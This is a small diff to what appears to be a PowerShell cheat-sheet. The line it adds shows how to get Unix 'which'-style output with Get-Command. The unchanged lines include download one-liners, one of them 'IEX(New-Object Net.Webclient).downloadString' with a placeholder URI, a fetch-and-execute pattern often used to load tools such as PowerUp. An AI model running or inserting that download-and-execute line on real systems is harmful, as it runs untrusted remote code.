@@ -16,3 +16,8 @@ Web requests (if one doesnt work, try the other). PowerUp!
 Invoke-WebRequest -Uri <target uri> -Method Get -Outfile <whatevs>.ps1 #IWR
 powershell IEX(New-Object Net.Webclient).downloadString("<target uri>") #Invoke-Expression
 ```
+
+"which" *nix equivalent, i.e. it gives *nix-style output.
+```
+Get-Command <your command> | Select-Object -ExpandProperty Definition
+```
